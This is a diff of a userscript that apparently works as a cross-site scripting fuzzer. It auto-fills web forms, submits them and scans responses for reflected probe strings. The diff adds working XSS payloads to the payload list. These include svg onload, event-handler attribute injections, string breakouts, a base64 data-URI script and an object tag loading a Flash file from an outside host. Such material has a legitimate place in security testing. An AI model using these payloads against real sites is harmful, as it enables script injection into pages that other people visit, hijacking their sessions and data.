@@ -3,7 +3,7 @@
 // @namespace   *
 // @description aaa"bbb'ccc<ddd>eee
 // @include     *
-// @version     2.1
+// @version     2.3
 // @grant       none
 // ==/UserScript==
 
@@ -13,14 +13,22 @@ var bFillHiddenForms = 0
 var iPayload = 0
 
 var aPayloads = ['aaa"bbb\'ccc<ddd>eee', 
-		 'aaa"bbb\'eee', 
-		 'aaa"eee', 
-		 'aaa"bbb\'ccc>ddd<eee', 
-		 'aaa"bbb\'ccc<<ddd>ddd<ddd>>eee', 
-		 'aaa\\"bbb\\\'ccc<ddd>fff</eee>']
+				 'aaa"bbb\'eee', 
+				 'aaa"eee', 
+				 'aaa\\"bbb\\\'>ccc<<ddd>ddd<ddd>>eee<fff', 
+				 'aaa\\"bbb\\\'ccc<ddd >eee</fff>', 
+				 '</title></textarea>aaa"bbb\'ccc<ddd>eee', 
+				 'aaa"><svg onload=alert(document.domain)>eee', 
+				 'aaa" autofocus onfocus="alert(document.domain)"eee', 
+				 'aaa" onmouseover="alert(document.domain)"eee', 
+				 'aaa" accesskey=x onclick="alert(document.domain)"eee', 
+				 'aaa\'-alert(document.domain)-\'eee', 
+				 'aaa"-alert(document.domain)-"eee', 
+				 'aaa"><video src onratechange=prompt(document.domain)>eee', 
+				 'aaa"><object allowscriptaccess="always" data="http://spqr.zz.mu/xss.swf"></object>eee', 
+				 'aaa"><a href=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</a>eee']
 
-var regex = /aaa.*?eee/gi
-var regex = /.{0,100}aaa.{0,50}?eee.{0,100}/gi
+var regex = /.{0,100}aaa.{0,100}?eee.{0,100}/gi
 
 window.addEventListener
 (
@@ -33,12 +41,12 @@ window.addEventListener
 			{
 				var sPrompt = prompt ('Fill hidden forms?', bFillHiddenForms)
 				
-				sPrompt == null || (bFillHiddenForms = parseInt (sPrompt))
+				sPrompt === null || (bFillHiddenForms = parseInt (sPrompt))
 			}
 			
 			if (e.keyCode == 80)
 			{
-				var sPrompt = prompt ('Choose payload', iPayload)
+				var sPrompt = prompt ('Set payload', iPayload)
 				
 				if (sPrompt !== null)
 				{
@@ -113,7 +121,10 @@ function submitForm (form)
 	
 	bForceUrlEncoded && (form.enctype = 'application/x-www-form-urlencoded')
 	
-	//	form.getAttribute ('action')
+	//	var sFormAction = form.getAttribute ('action')
+	//
+	//	if (!/^https?:\/\//.test (sFormAction))
+	//		sFormAction = /\/\//.test (sFormAction) ? location.protocol + sFormAction : location.origin + sFormAction
 	
 	var sFormAction = form.action ? form.action : location.origin + location.pathname
 	var sDelimeter = form.method == 'post' ? '\r\n\r\n' : '?'
